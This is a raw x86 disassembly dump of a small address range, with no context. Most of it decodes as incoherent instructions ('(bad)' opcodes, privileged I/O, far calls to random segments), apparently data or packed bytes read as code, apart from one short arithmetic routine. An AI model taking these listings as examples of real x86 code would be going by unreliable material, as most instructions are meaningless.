  41a231:	or     eax,DWORD PTR [ebx+0x41]
  41a234:	fs cmc 
  41a236:	mov    gs:0x7835435c,al
  41a23c:	in     al,0xd4
  41a23e:	dec    ebp
  41a23f:	lock call 0x5a9bb550
  41a245:	sub    eax,0x5b6d58cb
  41a24a:	outs   dx,DWORD PTR ds:[esi]
  41a24b:	arpl   WORD PTR [eax],bp
  41a24d:	ret    
  41a24e:	pop    es
  41a24f:	push   0xffffffe0
  41a251:	mov    al,ds:0xda0e1075
  41a256:	jns    0x41a23c
  41a258:	pop    eax
  41a259:	fisttp WORD PTR [edx]
  41a25b:	sub    DWORD PTR [edi+0x72],edi
  41a25e:	add    eax,DWORD PTR [ecx]
  41a260:	add    edi,DWORD PTR [eax+0x4]
  41a263:	pop    ecx
  41a264:	imul   edx,DWORD PTR [ebp-0x13],0xffffffd9
  41a268:	cs and eax,0x4519ae8d
  41a26e:	cmc    
  41a26f:	cli    
  41a270:	xchg   edx,eax
  41a271:	(bad)  
  41a272:	ficomp DWORD PTR [esi+0x63]
  41a275:	(bad)  
  41a276:	sysenter 
  41a278:	cmc    
  41a279:	add    BYTE PTR [edx+0x3529217],cl
  41a27f:	aaa    
  41a280:	stc    
  41a281:	ss push edi
  41a283:	ret    0x993b
  41a286:	shl    bh,cl
  41a288:	or     esi,DWORD PTR [edi+0x44]
  41a28b:	sahf   
  41a28c:	outs   dx,DWORD PTR ds:[esi]
  41a28d:	add    BYTE PTR [edi],0xc
  41a290:	stc    
  41a291:	cmp    DWORD PTR [edx],edi
  41a293:	xchg   esp,eax
  41a294:	pop    ebx
  41a295:	ror    BYTE PTR [ecx],1
  41a297:	cmc    
  41a298:	sub    BYTE PTR [ebx+edi*1+0x526346b],al
  41a29f:	sub    DWORD PTR [eax-0x46],esp
  41a2a2:	lods   al,BYTE PTR ds:[esi]
  41a2a3:	test   eax,0x66af49d9
  41a2a8:	jno    0x41a28e
  41a2aa:	push   eax
  41a2ab:	ja     0x41a31f
  41a2ad:	dec    esi
  41a2ae:	rcr    BYTE PTR [edx],1
  41a2b0:	inc    esi
  41a2b1:	xchg   DWORD PTR [esi-0xb],ebx
  41a2b4:	div    BYTE PTR [edx-0x25]
  41a2b7:	jb     0x41a2a9
  41a2b9:	sub    eax,0x1e79c254
  41a2be:	pop    ss
  41a2bf:	neg    BYTE PTR [ebx]
  41a2c1:	xchg   DWORD PTR [ebp+0x33],ebx
  41a2c4:	mov    dh,dl
  41a2c6:	xlat   BYTE PTR ds:[ebx]
  41a2c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2c8:	push   esp
  41a2c9:	outs   dx,DWORD PTR ds:[esi]
  41a2ca:	das    
  41a2cb:	loop   0x41a287
  41a2cd:	nop
  41a2ce:	mov    dl,0x3d
  41a2d0:	inc    ecx
  41a2d1:	in     al,dx
  41a2d2:	ins    BYTE PTR es:[edi],dx
  41a2d3:	push   eax
  41a2d4:	add    al,0xf7
  41a2d6:	xchg   esi,eax
  41a2d7:	ins    BYTE PTR es:[edi],dx
  41a2d8:	js     0x41a2a3
  41a2da:	xor    al,0x3f
  41a2dc:	xchg   BYTE PTR [edx],ah
  41a2de:	outs   dx,DWORD PTR ds:[esi]
  41a2df:	inc    esp
  41a2e0:	adc    BYTE PTR [esi],bh
  41a2e2:	call   FWORD PTR [edx]
  41a2e4:	enter  0x2223,0x3d
  41a2e8:	mov    ah,0x4d
  41a2ea:	les    esi,FWORD PTR [edx-0x4b7a288b]
  41a2f0:	int    0x6b
  41a2f2:	and    al,0xb2
  41a2f4:	and    esi,esp
  41a2f6:	mov    ds:0x7c2d8590,al
  41a2fb:	xchg   DWORD PTR [ebp+esi*2+0x6fb63997],esi
  41a302:	mov    edx,0x67a3a493
  41a307:	in     eax,0x21
  41a309:	xlat   BYTE PTR ds:[ebx]
  41a30a:	push   0x74
  41a30c:	retf   0xed1
  41a30f:	pop    esp
  41a310:	add    eax,0x61e4bd78
  41a315:	jnp    0x41a30b
  41a317:	jmp    0x41d5f834
  41a31c:	fwait
  41a31d:	inc    eax
  41a31e:	and    al,0xb5
  41a320:	add    ebx,DWORD PTR cs:[edi-0x6f63f168]
  41a327:	adc    DWORD PTR [edx],ebp
  41a329:	(bad)  
  41a32a:	mov    eax,0x606974b2
  41a32f:	sbb    BYTE PTR [ebp+edi*1-0x57],0x6a
  41a334:	push   edi
  41a335:	lods   al,BYTE PTR ds:[esi]
  41a336:	pop    ds
  41a337:	ins    DWORD PTR es:[edi],dx
  41a338:	lea    esp,[edx-0x2165e923]
  41a33e:	push   ebp
  41a33f:	nop
  41a340:	pop    ebx
  41a341:	test   DWORD PTR ds:0xb35e56e0,0xcdb2289
  41a34b:	(bad)  
  41a34c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a34d:	lea    edi,[eax+0x23]
  41a350:	or     ecx,edi
  41a352:	jo     0x41a337
  41a354:	xor    DWORD PTR [ebx+0xa],ecx
  41a357:	jns    0x41a311
  41a359:	pop    esi
  41a35a:	jns    0x41a3d0
  41a35c:	pop    ds
  41a35d:	std    
  41a35e:	dec    ebp
  41a35f:	mov    ecx,0x275716bd
  41a364:	fwait
  41a365:	sar    BYTE PTR [edi+0x71625f6],cl
  41a36b:	stc    
  41a36c:	cdq    
  41a36d:	loop   0x41a36e
  41a36f:	popf   
  41a370:	fbld   TBYTE PTR [ebp+0x6c6aed8e]
  41a376:	jmp    0x41a31c
  41a378:	mov    dh,0x5e
  41a37a:	aad    0xa7
  41a37c:	popf   
  41a37d:	repnz (bad) 
  41a37f:	mov    esp,0x50350b87
  41a384:	and    eax,0x63fd89b6
  41a389:	xor    BYTE PTR [eax],cl
  41a38b:	xor    al,0xa6
  41a38d:	cmp    DWORD PTR [ecx+esi*4+0x53a0b6f1],ebp
  41a394:	repz mov edx,0xdb579d38
  41a39a:	add    bl,al
  41a39c:	push   ds
  41a39d:	stc    
  41a39e:	dec    ebx
  41a39f:	cmp    DWORD PTR [edi+esi*1-0x27e2753],ecx
  41a3a6:	jle    0x41a360
  41a3a8:	loope  0x41a339
  41a3aa:	in     al,dx
  41a3ab:	mov    edi,DWORD PTR [edi+0x32177d63]
  41a3b1:	stc    
  41a3b2:	add    esp,eax
  41a3b4:	xor    DWORD PTR [ecx-0x7dc3e463],0x7d
  41a3bb:	mov    al,ds:0x723c415b
  41a3c0:	(bad)  
  41a3c1:	inc    DWORD PTR [esp+edi*2]
  41a3c4:	cs aaa 
  41a3c6:	or     bl,al
  41a3c8:	dec    ecx
  41a3c9:	xor    ebp,DWORD PTR [eax+0x31849d1c]
  41a3cf:	xchg   ecx,eax
  41a3d0:	imul   esi,DWORD PTR [ebx-0x7a7966d2],0xffffffa0
  41a3d7:	dec    eax
  41a3d8:	mov    edi,0xc5daeff5
  41a3dd:	push   cs
  41a3de:	xchg   ebx,eax
  41a3df:	jmp    0xae6f9c22
  41a3e4:	idiv   BYTE PTR [eax-0x29]
  41a3e7:	cmp    al,BYTE PTR [edi]
  41a3e9:	into   
  41a3ea:	sbb    DWORD PTR [eax-0x68c0d750],ecx
  41a3f0:	jno    0x41a3dc
  41a3f2:	sub    BYTE PTR [edx+0x3c],ch
  41a3f5:	jecxz  0x41a3bf
  41a3f7:	mov    bl,0x56
  41a3f9:	mov    dl,0xf6
  41a3fb:	gs sub ecx,eax
  41a3fe:	fisubr DWORD PTR ds:0x64ce52dd
  41a404:	mov    ds:0x2f07edca,eax
  41a409:	mov    DWORD PTR [eax-0x6b4048e0],ebx
  41a40f:	repnz retf 0x689b
  41a413:	popf   
  41a414:	push   esi
  41a415:	idiv   BYTE PTR [ebp-0x3c]
  41a418:	pop    ds
  41a419:	out    dx,eax
  41a41a:	loope  0x41a47d
  41a41c:	add    eax,DWORD PTR [esi-0x28]
  41a41f:	out    dx,al
  41a420:	out    0x63,al
  41a422:	push   ecx
  41a423:	push   eax
  41a424:	int3   
  41a425:	jp     0x41a432
  41a427:	jge    0x41a49a
  41a429:	arpl   ax,ax
  41a42b:	xchg   ebp,eax
  41a42c:	gs or  dh,ch
  41a42f:	std    
  41a430:	addr16 inc edi
  41a432:	loopne 0x41a3c4
  41a434:	out    0x83,al
  41a436:	xchg   esp,eax
  41a437:	iret   
  41a438:	or     BYTE PTR [ecx+0x7f],0x55
  41a43c:	and    BYTE PTR [edi+0x3e3a3073],dh
  41a442:	into   
  41a443:	push   ds
  41a444:	mov    edx,DWORD PTR [edx-0x7e]
  41a447:	stos   DWORD PTR es:[edi],eax
  41a448:	rcl    DWORD PTR [eax],cl
  41a44a:	ss mov bh,0xc2
  41a44d:	enter  0xc251,0x23
  41a451:	nop
  41a452:	out    0x12,eax
  41a454:	bound  esp,QWORD PTR [edi+0x79a370dc]
  41a45a:	jae    0x41a49b
  41a45c:	inc    ebp
  41a45d:	jmp    0x41a476
  41a45f:	and    al,0xe9
  41a461:	ins    BYTE PTR es:[edi],dx
  41a462:	adc    eax,0x783c5da
  41a467:	int    0xc9
  41a469:	adc    al,BYTE PTR [eax+0x3a]
  41a46c:	sub    eax,0xb8882887
  41a471:	mov    ecx,DWORD PTR [edx-0x74fbc147]
  41a477:	xchg   esp,eax
  41a478:	jmp    0x41a456
  41a47a:	xchg   DWORD PTR [ebx-0x45cbc495],ebx
  41a480:	sbb    eax,DWORD PTR [ebp-0x1f]
  41a483:	cmp    BYTE PTR [esi],0x16
  41a486:	or     al,0x39
  41a488:	add    eax,eax
  41a48a:	jge    0x41a445
  41a48c:	xor    eax,0x4a0f4cac
  41a491:	push   ecx
  41a492:	pop    ebp
  41a493:	mov    cs,esi
  41a495:	or     al,0x43
  41a497:	sub    al,0xb5
  41a499:	jmp    DWORD PTR [ebp-0x38be9641]
  41a49f:	sub    edi,ebp
  41a4a1:	retf   
  41a4a2:	int    0x83
  41a4a4:	sbb    ebp,ebp
  41a4a6:	and    eax,0x2c783750
  41a4ab:	mov    al,ds:0x39cdb601
  41a4b0:	iret   
  41a4b1:	dec    BYTE PTR [ebp-0x3e]
  41a4b4:	mov    eax,0xa79988c8
  41a4b9:	test   DWORD PTR [esi-0x4e],edx
  41a4bc:	test   eax,0x9fba36e4
  41a4c1:	in     eax,0x5
  41a4c3:	int3   
  41a4c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4c5:	sub    DWORD PTR [edx],edi
  41a4c7:	jne    0x41a4ad
  41a4c9:	neg    BYTE PTR [esi]
  41a4cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4cc:	inc    eax
  41a4cd:	sbb    cl,BYTE PTR [ebx+0x77]
  41a4d0:	ins    DWORD PTR es:[edi],dx
  41a4d1:	or     BYTE PTR [esi+esi*8],0x77
  41a4d5:	sahf   
  41a4d6:	test   cl,ah
  41a4d8:	pop    esi
  41a4d9:	jge    0x41a4ed
  41a4db:	pop    edx
  41a4dc:	js     0x41a4d4
  41a4de:	leave  
  41a4df:	iret   
  41a4e0:	sbb    BYTE PTR [edx+0x21],bl
  41a4e3:	adc    ebp,edx
  41a4e5:	iret   
  41a4e6:	inc    eax
  41a4e7:	xchg   esp,eax
  41a4e8:	mov    ds:0x4292708b,eax
  41a4ed:	stos   DWORD PTR es:[edi],eax
  41a4ee:	ret    
  41a4ef:	mov    bh,0x6e
  41a4f1:	cmp    eax,DWORD PTR [edx]
  41a4f3:	push   ecx
  41a4f4:	mov    cl,BYTE PTR [eax-0x3faebe7d]
  41a4fa:	sub    DWORD PTR [esi-0x44964bbb],edx
  41a500:	inc    ebx
  41a501:	stc    
  41a502:	shl    DWORD PTR [ecx+ebp*1+0x29e95148],0xb2
  41a50a:	jmp    0x41a528
  41a50c:	mov    ebp,0x6a514876
  41a511:	push   ss
  41a512:	retf   
  41a513:	push   ebp
  41a514:	adc    al,0x61
  41a516:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a517:	add    bl,BYTE PTR [edi-0x1c06c50d]
  41a51d:	xor    bh,ch
  41a51f:	frstor [ecx+0x2c]
  41a522:	and    DWORD PTR [edi],ebx
  41a524:	dec    esp
  41a525:	xor    al,BYTE PTR [edi+0x2f]
  41a528:	xchg   ebx,eax
  41a529:	into   
  41a52a:	std    
  41a52b:	cmovo  esi,DWORD PTR [ecx+0x6b]
  41a52f:	fstp   TBYTE PTR [edx-0x7d]
  41a532:	out    dx,eax
  41a533:	sub    eax,0x68b39f2c
  41a538:	scas   eax,DWORD PTR es:[edi]
  41a539:	push   ebx
  41a53a:	adc    DWORD PTR [ecx],edi
  41a53c:	dec    edx
  41a53d:	push   ss
  41a53e:	or     al,0x0
  41a540:	adc    esi,DWORD PTR [ebp+0xe752ac9]
  41a546:	int    0x86
  41a548:	imul   esp,edi,0xffffffb9
  41a54b:	jmp    0x3330cfcb
  41a550:	and    DWORD PTR [ecx+0x894629b],esi
  41a556:	cmp    dh,BYTE PTR [edx]
  41a558:	pushf  
  41a559:	xor    eax,0xdbcb9d9b
  41a55e:	dec    DWORD PTR [edi-0x42ed56db]
  41a564:	or     al,0xc8
  41a566:	sbb    eax,0xfe3c6b33
  41a56b:	push   ss
  41a56c:	fs je  0x41a569
  41a56f:	jp     0x41a5ae
  41a571:	jmp    0x15b2:0xf3235507
  41a578:	stos   BYTE PTR es:[edi],al
  41a579:	lahf   
  41a57a:	inc    ebx
  41a57b:	pop    es
  41a57c:	xchg   BYTE PTR [ebp+eax*4-0x40],ch
  41a580:	dec    esp
  41a581:	cmp    eax,0xc826d8b6
  41a586:	mov    cl,0x55
  41a588:	(bad)  
  41a589:	test   eax,0x8f16f26c
  41a58e:	sub    DWORD PTR [ebp+0x38],0xffffffb3
  41a592:	(bad)  
  41a593:	out    dx,al
  41a594:	aas    
  41a595:	inc    DWORD PTR [esi+0x44]
  41a598:	bound  esi,QWORD PTR [ecx+0x36]
  41a59b:	push   edi
  41a59c:	data16 std 
  41a59e:	push   ebp
  41a59f:	mov    eax,0x3414fba5
  41a5a4:	not    BYTE PTR [edx]
  41a5a6:	stc    
  41a5a7:	or     al,0xee
  41a5a9:	lahf   
  41a5aa:	mov    dl,bl
  41a5ac:	repz push ss
  41a5ae:	cmp    edx,DWORD PTR [esi+0x3e53ab4f]
  41a5b4:	fcomp  DWORD PTR [ecx]
  41a5b6:	sbb    DWORD PTR [edi+0x77b06ad0],ecx
  41a5bc:	dec    edi
  41a5bd:	leave  
  41a5be:	popa   
  41a5bf:	push   ebx
  41a5c0:	xor    al,0x69
  41a5c2:	xor    edi,DWORD PTR [edi-0x388a6a7c]
  41a5c8:	xchg   BYTE PTR [edx],ah
  41a5ca:	(bad)  
  41a5cb:	cwde   
  41a5cc:	loope  0x41a5c4
  41a5ce:	ret    0xf086
  41a5d1:	mov    ds:0x26d6aa44,eax
  41a5d6:	mov    eax,0xd29da226
  41a5db:	pushf  
  41a5dc:	ret    0x63a
  41a5df:	repnz xor DWORD PTR [esp+ebx*8],edi
  41a5e3:	dec    esi
  41a5e4:	mov    al,ds:0x3366799d
  41a5e9:	sar    DWORD PTR [ebx+0x797d57b],1
  41a5ef:	sub    al,0x36
  41a5f1:	mov    bl,0xcd
  41a5f3:	test   al,0xa9
  41a5f5:	dec    ebp
  41a5f6:	or     ebp,DWORD PTR [edx]
  41a5f8:	into   
  41a5f9:	aam    0xbb
  41a5fb:	lods   al,BYTE PTR ds:[esi]
  41a5fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5fd:	(bad)  
  41a5fe:	mov    ecx,0x4e7ea6c4
  41a603:	pop    edx
  41a604:	js     0x41a58c
  41a606:	add    eax,0xf6005c11
  41a60b:	pop    ecx
  41a60c:	push   ebp
  41a60d:	nop
  41a60e:	mov    eax,ds:0xe06614cb
  41a613:	xor    DWORD PTR [eax-0x3a3c82f3],0x3b
  41a61a:	pop    es
  41a61b:	sub    al,0xf9
  41a61d:	dec    edi
  41a61e:	xchg   esp,eax
  41a61f:	les    eax,FWORD PTR [edi+eiz*8-0x369179d4]
  41a626:	adc    al,0x6c
  41a628:	enter  0x874f,0x93
  41a62c:	cs xchg ebp,eax
  41a62e:	xor    al,0x84
  41a630:	into   
  41a631:	in     al,dx
  41a632:	lea    edx,[ecx+eax*8+0x34c82bd1]
  41a639:	xchg   esp,eax
  41a63a:	mov    BYTE PTR [ebx+0x7],0xfb
  41a63e:	xchg   edx,eax
  41a63f:	loopne 0x41a6af
  41a641:	adc    cl,BYTE PTR [esi]
  41a643:	es mov edx,0x83d54c13
  41a649:	aas    
  41a64a:	lds    ebx,FWORD PTR [edi+0x1803c429]
  41a650:	xchg   ebp,eax
  41a651:	jmp    0x41a635
  41a653:	das    
  41a654:	add    DWORD PTR [ebx],ecx
  41a656:	xchg   BYTE PTR [esi],ch
  41a658:	jmp    0xee7c19a1
  41a65d:	add    ebp,eax
  41a65f:	mov    cl,0x1d
  41a661:	ja     0x41a6ca
  41a663:	stos   DWORD PTR es:[edi],eax
  41a664:	hlt    
  41a665:	add    al,0xe4
  41a667:	loopne 0x41a613
  41a669:	mov    bl,0x91
  41a66b:	sbb    al,0x65
  41a66d:	inc    ebx
  41a66e:	dec    ebp
  41a66f:	es push cs
  41a671:	mov    dl,0xd
  41a673:	popf   
  41a674:	aas    
  41a675:	or     edx,DWORD PTR [ebx]
  41a677:	iret   
  41a678:	pop    esi
  41a679:	xchg   edx,eax
  41a67a:	arpl   WORD PTR [ebx],sp
  41a67c:	add    edi,DWORD PTR [ebp+0x7f]
  41a67f:	jg     0x41a684
  41a681:	sub    al,0x43
  41a683:	add    al,al
  41a685:	test   DWORD PTR [esi-0x4bf6afdc],eax
  41a68b:	sub    edi,DWORD PTR ds:0xfa7c4753
  41a691:	ud0    ebx,ebx
  41a694:	fisub  WORD PTR [edi+edi*1-0x6fdb435e]
  41a69b:	sar    BYTE PTR [ebx],0x3a
  41a69e:	adc    al,0xf6
  41a6a0:	retf   0x8506
  41a6a3:	or     eax,0xcb996805
  41a6a8:	sbb    cl,BYTE PTR [edi-0x218479f7]
  41a6ae:	mov    edi,0xd9ddfc69
  41a6b3:	mov    BYTE PTR [eax],0x51
  41a6b6:	pop    eax
  41a6b7:	out    0xe,al
  41a6b9:	mov    dl,0x1d
  41a6bb:	pop    esi
  41a6bc:	xor    eax,0x9e02556b
  41a6c1:	popf   
  41a6c2:	xor    BYTE PTR [ebx],ch
  41a6c4:	les    eax,FWORD PTR [esi-0xe]
  41a6c7:	push   edi
  41a6c8:	out    dx,al
  41a6c9:	xchg   DWORD PTR [edx+eiz*1-0x3aee6184],ebp
  41a6d0:	aaa    
  41a6d1:	int    0x5f
  41a6d3:	jmp    0x74386fbd
  41a6d8:	fucomp st(7)
  41a6da:	in     eax,dx
  41a6db:	xlat   BYTE PTR ds:[ebx]
  41a6dc:	push   ebx
  41a6dd:	pop    edi
  41a6de:	fsub   QWORD PTR [edx-0x4aca763]
  41a6e4:	push   esp
  41a6e5:	out    dx,eax
  41a6e6:	stc    
  41a6e7:	stos   BYTE PTR es:[edi],al
  41a6e8:	xor    DWORD PTR [edi+0x3aba9c30],edx
  41a6ee:	adc    dl,BYTE PTR ds:0x540e91a1
  41a6f4:	xor    DWORD PTR [ecx+0x2],ebx
  41a6f7:	sahf   
  41a6f8:	test   BYTE PTR [ecx],cl
  41a6fa:	fwait
  41a6fb:	ds push edx
  41a6fd:	xor    al,0xd8
  41a6ff:	test   al,0x93
  41a701:	and    DWORD PTR [ebx+eiz*1+0x20d111b5],ecx
  41a708:	push   cs
  41a709:	cmp    eax,ebx
  41a70b:	outs   dx,BYTE PTR ds:[esi]
  41a70c:	retf   
  41a70d:	in     eax,dx
  41a70e:	push   edx
  41a70f:	xchg   ebx,eax
  41a710:	inc    cx
  41a712:	fwait
  41a713:	inc    edx
  41a714:	mov    esi,0x6f4b9f08
  41a719:	fimul  WORD PTR [esi]
  41a71b:	sub    dh,cl
  41a71d:	add    eax,0x7365e0d4
  41a722:	xchg   DWORD PTR [edi],ebp
  41a724:	scas   eax,DWORD PTR es:[edi]
  41a725:	rcr    DWORD PTR [ebp+0x3708afbd],cl
  41a72b:	lock push si
  41a72e:	cmp    edi,0xcdf441b
  41a734:	daa    
  41a735:	and    dl,BYTE PTR [ebx-0x6965e2d6]
  41a73b:	js     0x41a729
  41a73d:	cmc    
  41a73e:	cmc    
  41a73f:	mov    BYTE PTR [eax-0x72],cl
  41a742:	int    0x46
  41a744:	stc    
  41a745:	and    eax,0x2051de78
  41a74a:	les    edi,FWORD PTR [edx-0x2]
  41a74d:	mov    dl,al
  41a74f:	xor    al,0xec
  41a751:	jb     0x41a74c
  41a753:	shr    DWORD PTR [ecx+0xb],0x6a
  41a757:	add    al,0x60
  41a759:	xchg   BYTE PTR [eax],dl
  41a75b:	sbb    al,0x68
  41a75d:	jns    0x41a722
  41a75f:	xor    ch,al
  41a761:	fsubr  QWORD PTR [ebp-0x50101d1e]
  41a767:	mov    edi,0x47b5799a
  41a76c:	add    BYTE PTR [ecx-0xeffcf58],ch
  41a772:	sahf   
  41a773:	loopne 0x41a724
  41a775:	out    0xb7,al
  41a777:	std    
  41a778:	sub    eax,0x86efc296
  41a77d:	adc    ecx,ecx
  41a77f:	push   ebx
  41a780:	xchg   ecx,eax
  41a781:	aaa    
  41a782:	mov    edx,0x23a6556a
  41a787:	les    ebp,FWORD PTR [ecx-0x33d6f299]
  41a78d:	inc    esi
  41a78e:	sub    ebp,edi
  41a790:	aas    
  41a791:	push   ebp
  41a792:	rcr    DWORD PTR [esi-0x2],cl
  41a795:	mov    DWORD PTR [edi+0x774a313a],0x9ffa08c3
  41a79f:	pop    ecx
  41a7a0:	arpl   WORD PTR [esp+esi*1],cx
  41a7a3:	sbb    DWORD PTR [edx],ecx
  41a7a5:	mov    cl,0x43
  41a7a7:	push   esi
  41a7a8:	sar    BYTE PTR [edx-0x51],1
  41a7ab:	jg     0x41a7bc
  41a7ad:	push   esp
  41a7ae:	sbb    DWORD PTR [ecx+0x238b809a],esi
  41a7b4:	mov    ebp,0x2c0f4b90
  41a7b9:	test   eax,0x89b3b07e
  41a7be:	mov    dh,0x9c
  41a7c0:	add    BYTE PTR [edx-0x13aa743e],0x89
  41a7c7:	push   ebp
  41a7c8:	or     cl,ch
  41a7ca:	mov    ecx,0x8b000023
  41a7cf:	push   ebp
  41a7d0:	or     BYTE PTR [ebx-0x2fcc07a3],cl
  41a7d6:	xor    ebx,eax
  41a7d8:	sub    edx,ebx
  41a7da:	sub    edx,esi
  41a7dc:	xor    edx,eax
  41a7de:	mov    DWORD PTR [ebp+0x8],edx
  41a7e1:	mov    edx,DWORD PTR [ebp+0x8]
  41a7e4:	mov    ebx,DWORD PTR [ebp-0x58]
  41a7e7:	add    edx,0x5708c4
  41a7ed:	imul   edx,ebx
  41a7f0:	mov    DWORD PTR [ebp-0x58],edx
  41a7f3:	mov    edx,DWORD PTR [ebp+0x8]
  41a7f6:	mov    ebx,DWORD PTR [ebp-0x54]
  41a7f9:	add    edx,0x64f8da
  41a7ff:	or     edx,ebx
  41a801:	mov    DWORD PTR [ebp-0x54],edx
  41a804:	mov    edx,DWORD PTR [ebp+0x8]
  41a807:	mov    ebx,DWORD PTR [ebp-0x50]
  41a80a:	add    edx,ecx
  41a80c:	xor    edx,ebx
  41a80e:	mov    DWORD PTR [ebp-0x50],edx
  41a811:	mov    edx,DWORD PTR [ebp+0x8]
  41a814:	mov    ebx,DWORD PTR [ebp-0x4c]
  41a817:	add    edx,edi
  41a819:	jmp    0x41cb62
  41a81e:	retf   
  41a81f:	lock xacquire sub DWORD PTR [ebx+0x2b],esi
  41a824:	mov    bl,0x72
  41a826:	cmp    bl,BYTE PTR [ebp+ebx*2-0x21e903d2]
  41a82d:	inc    ecx
  41a82e:	nop
  41a82f:	adc    edi,DWORD PTR [ebp+0x7c]
  41a832:	inc    eax
  41a833:	pop    edi
  41a834:	jl     0x41a8b2
  41a836:	mov    dl,0x30
  41a838:	cli    
  41a839:	inc    ecx
  41a83a:	push   ebx
  41a83b:	xor    ecx,ecx
  41a83d:	nop
  41a83e:	xchg   esi,eax
  41a83f:	and    eax,0x727097ed
  41a844:	icebp  
  41a845:	jne    0x41a816
  41a847:	retf   0x3e7c
  41a84a:	push   cs
  41a84b:	bound  edx,QWORD PTR [ecx]
  41a84d:	cli    
  41a84e:	push   ss
  41a84f:	add    al,0x36
  41a851:	xchg   edx,eax
  41a852:	push   ebp
  41a853:	jmp    0x41a8c9
  41a855:	add    eax,0xffffffd0
  41a858:	pop    ebp
  41a859:	or     edi,DWORD PTR [ecx]
  41a85b:	cmp    edi,esp
  41a85d:	daa    
  41a85e:	or     eax,0x6ed2de7d
  41a863:	fstp   QWORD PTR ds:0x550ad268
  41a869:	nop
  41a86a:	shl    bl,cl
  41a86c:	pop    esp
  41a86d:	cld    
  41a86e:	mov    ebx,0x78d04ad4
  41a873:	ds cmc 
  41a875:	xchg   ecx,eax
  41a876:	xchg   eax,edx
  41a878:	out    0xb9,eax
  41a87a:	cld    
  41a87b:	int    0x71
  41a87d:	or     ah,ch
  41a87f:	sti    
  41a880:	xor    al,0x35
  41a882:	rcl    BYTE PTR [ebx],cl
  41a884:	test   edx,edx
  41a886:	sbb    al,0x46
  41a888:	sbb    BYTE PTR [edx+eax*4-0x44eede8e],0x35
  41a890:	mov    ebp,0x865a02e7
  41a895:	xor    bl,cl
  41a897:	lods   eax,DWORD PTR ds:[esi]
  41a898:	xchg   ecx,eax
  41a899:	imul   eax,DWORD PTR [ebp-0x75],0xf3a23d24
  41a8a0:	push   ebx
  41a8a1:	call   0xd5b0:0xe6829e46
  41a8a8:	push   0xf2ddb73e
  41a8ad:	fwait
  41a8ae:	cmc    
  41a8af:	stc    
  41a8b0:	cmp    al,BYTE PTR [eax+0xf]
  41a8b3:	dec    ebx
  41a8b4:	cld    
  41a8b5:	push   ds
  41a8b6:	pop    ebp
  41a8b7:	pop    edx
  41a8b8:	mov    ebx,0x132a8640
  41a8bd:	or     eax,0xbfdb0f2c
  41a8c2:	fidiv  DWORD PTR [edx+edx*1-0x20]
  41a8c6:	lods   eax,DWORD PTR ds:[esi]
  41a8c7:	xor    DWORD PTR [edi+0x41],esi
  41a8ca:	cmp    BYTE PTR [bp+di-0xa5],dh
  41a8cf:	arpl   cx,bx
  41a8d1:	call   FWORD PTR [eax+0xd]
  41a8d4:	out    dx,al
  41a8d5:	push   ss
  41a8d6:	aaa    
  41a8d7:	packuswb mm7,QWORD PTR [edi+0x66dccf7a]
  41a8de:	push   eax
  41a8df:	pop    esi
  41a8e1:	push   es
  41a8e2:	and    al,0xe8
  41a8e4:	pop    esi
  41a8e5:	ds pop esi
  41a8e7:	jg     0x41a8c3
  41a8e9:	jo     0x41a8f3
  41a8eb:	mov    eax,ds:0xfc844bf3
  41a8f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8f1:	xor    edi,DWORD PTR [ecx+0x7]
  41a8f4:	dec    edx
  41a8f5:	xlat   BYTE PTR ds:[ebx]
  41a8f6:	jo     0x41a926
  41a8f8:	pop    ebp
  41a8f9:	xor    edi,DWORD PTR [eax]
  41a8fb:	or     DWORD PTR [ebx-0x22fad0ec],esp
  41a901:	dec    eax
  41a902:	xchg   BYTE PTR [eax],dh
  41a904:	sub    eax,0x1dee46cf
  41a909:	mov    ch,0xba
  41a90b:	ror    bl,1
  41a90d:	ffreep st(6)
  41a90f:	stos   DWORD PTR es:[edi],eax
  41a910:	fcomp  DWORD PTR [eax-0x3dd29cec]
  41a916:	jl     0x41a8fe
  41a918:	xchg   DWORD PTR [edi+0x78],esp
  41a91b:	inc    ebp
  41a91c:	jl     0x41a964
  41a91e:	xor    al,0xd5
  41a920:	les    eax,FWORD PTR [ecx-0x59]
  41a923:	and    BYTE PTR [eax],cl
  41a925:	call   0x392e:0x44f6945c
  41a92c:	not    edi
  41a92e:	mov    ecx,0xc321f94f
  41a933:	out    dx,al
  41a934:	ds mov al,0x7
  41a937:	daa    
  41a938:	xchg   edx,eax
  41a939:	pop    esp
  41a93a:	mov    ebx,0x81e14e0e
  41a93f:	call   0x7964:0x376c3f26
  41a946:	(bad)  
  41a947:	mov    ds:0x6431ea6f,eax
  41a94c:	fiadd  WORD PTR ds:0xc1228c77
  41a952:	leave  
  41a953:	(bad)  
  41a954:	fstp   DWORD PTR [ebx+0x7b]
  41a957:	lds    esi,FWORD PTR [edi+0x50fec1f1]
  41a95d:	(bad)  
  41a95e:	out    dx,al
  41a95f:	or     al,0x64
  41a961:	sbb    dl,BYTE PTR [edi]
  41a963:	popf   
  41a964:	push   esp
  41a965:	out    dx,al
  41a966:	shr    al,cl
  41a968:	out    0xf8,al
  41a96a:	jmp    0x507faadd
  41a96f:	cmp    eax,0xecad5f5c
  41a974:	xor    BYTE PTR [ebx+0x15],0x5f
  41a978:	into   
  41a979:	and    BYTE PTR [edx+0xc],0x78
  41a97d:	xchg   esi,eax
  41a97e:	lods   al,BYTE PTR ds:[esi]
  41a97f:	in     al,dx
  41a980:	retf   0x1c72
  41a983:	std    
  41a984:	fadd   QWORD PTR [eax-0x24]
  41a987:	out    0x57,eax
  41a989:	jbe    0x41aa04
  41a98b:	in     eax,0x7e
  41a98d:	and    BYTE PTR [ebp+edx*1-0x62673931],bh
  41a994:	nop
  41a995:	mov    ebp,0xb4b95e66
  41a99a:	sub    BYTE PTR [ebp+0x7c],0x6d
  41a99e:	add    al,0xcd
  41a9a0:	jg     0x41a968
  41a9a2:	arpl   WORD PTR [esi-0x5f],bp
  41a9a5:	xor    dl,BYTE PTR [esi+0x586669ee]
  41a9ab:	pop    es
  41a9ac:	out    dx,eax
  41a9ad:	cmp    al,0x6b
  41a9af:	verw   WORD PTR [edi-0x7c]
  41a9b3:	or     cl,bl
